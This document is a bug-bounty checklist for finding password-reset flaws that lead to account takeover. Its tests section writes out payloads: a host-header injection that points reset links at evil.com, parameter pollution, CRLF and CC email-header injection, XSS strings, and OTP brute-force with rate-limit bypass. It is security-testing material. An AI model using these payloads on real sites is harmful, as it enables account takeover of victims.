---
tags: [bugbounty, checklist, vuln/password-reset, p1, p2]
aliases: [Password Reset, Forgot Password Testing]
cssclasses: [bb-hunter]
updated: 2026-04-21
---

# Forgot Password Functionality Checklist

> [!tldr] Hunter Summary
> **What:** Logic flaws in password reset flow that allow attacker to reset victim's password.
> **Impact:** Full ATO — P1 in most programs.
> **Time to triage:** 15–20 min to fully test the flow.

---

## Full Test Checklist

```
[ ] 1. Host header injection → steal reset link
[ ] 2. Parameter pollution (multiple email= params)
[ ] 3. Email separator abuse (comma, space, pipe, null byte, CRLF)
[ ] 4. Brute force OTP (4–6 digit codes, no rate limit?)
[ ] 5. Token predictability (time-based, sequential, user-based)
[ ] 6. Token reuse (same token works twice?)
[ ] 7. Token for one account works for another
[ ] 8. XSS in reset form (email reflected?)
[ ] 9. JSON body: add extra email key
[ ] 10. No domain validation (email=victim, email=victim@mail)
[ ] 11. Race condition on token generation
[ ] 12. Password change doesn't invalidate old sessions
[ ] 13. Reset link never expires
[ ] 14. CSRF on reset form
[ ] 15. Email header injection (CC: attacker)
```

---

## Step-by-Step Tests

### Test 1 — Host Header Injection
```http
POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
Content-Type: application/x-www-form-urlencoded

email=victim@mail.com
```
Expected: reset email contains link to evil.com

```http
POST /forgot-password HTTP/1.1
Host: evil.com

email=victim@mail.com
```

### Test 2 — Parameter Pollution
```
email=victim@mail.com&email=attacker@mail.com
email[]=victim@mail.com&email[]=attacker@mail.com
```

### Test 3 — Email Separator Abuse
```
email=victim@mail.com,attacker@mail.com
email=victim@mail.com%20attacker@mail.com
email=victim@mail.com|attacker@mail.com
email=victim@mail.com%0a%0dcc:attacker@mail.com
email=victim@mail.com%00attacker@mail.com
```

### Test 4 — OTP Brute Force
```bash
# 4-digit OTP: 10000 combos
# 6-digit OTP: 1000000 combos
# Burp Intruder: numeric range attack
# Check: lockout after N attempts?
# Check: rate limit with X-Forwarded-For bypass?
# Check: same OTP across all users?
```

### Test 5 — Token Analysis
```bash
# Request 3 reset tokens for your own account
# Compare: are they sequential? Same length? Same format?
# Decode base64 → may reveal timestamp or user ID
# MD5/SHA hash of (email + timestamp) → compute current one

# Try: increment/decrement token by 1
# Try: use token after password already reset
# Try: share one account's token with another account's email
```

### Test 6 — JSON Extra Email Field
```json
POST /api/reset
{"email": "victim@mail.com", "email": "attacker@mail.com"}

{"email": "victim@mail.com", "attacker@mail.com", "token": "abc"}
```

### Test 7 — No TLD / No Domain
```
email=victim
email=victim@mail
email=@victim.com
```

### Test 8 — XSS in Reset Page
```
email="<svg/onload=alert(1)>"@gmail.com
email='"\'><svg onload=alert(1)>
```

### Test 9 — Email Header Injection
```
email=victim@mail.com%0a%0dcc:attacker@mail.com
email=victim@mail.com%0abcc:attacker@mail.com
email=victim@mail.com\r\ncc:attacker@mail.com
```

### Test 10 — Session Persistence Post-Reset
After victim resets password:
- Does old session (attacker's captured cookie) still work?
- Does the reset token remain valid after use?

---

## 2025-2026 Notes

> [!info]
> - **Passkey apps:** If app has both passkey and password reset — test if password reset bypasses passkey requirement
> - **Magic link flow:** Magic link tokens often share the same generation code as reset tokens — test both
> - **SSO bypass:** Many apps bypass password reset entirely if you can SSO as victim

---

## References

- anugrahsr password reset flaws — https://anugrahsr.github.io/posts/10-Password-reset-flaws/
- PortSwigger Password reset — https://portswigger.net/web-security/authentication/other-mechanisms
